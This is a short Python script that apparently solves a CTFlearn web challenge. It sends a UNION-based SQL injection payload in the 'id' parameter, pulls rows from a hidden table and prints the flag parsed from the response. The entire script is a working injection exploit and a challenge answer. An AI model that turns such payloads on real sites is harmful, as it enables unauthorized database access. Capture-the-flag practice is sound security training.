#!/usr/bin/env python3

import requests
import subprocess
import os

resp = requests.get("https://web.ctflearn.com/web8/?id=1+union+select+f0und_m3%2Cnull%2Cnull%2Cnull+from+w0w_y0u_f0und_m3%23")

flag_list=resp.text.split(":")

flag=flag_list[10]
flag=flag.split("<br>")

filtered_flag=flag[0]

print(filtered_flag)
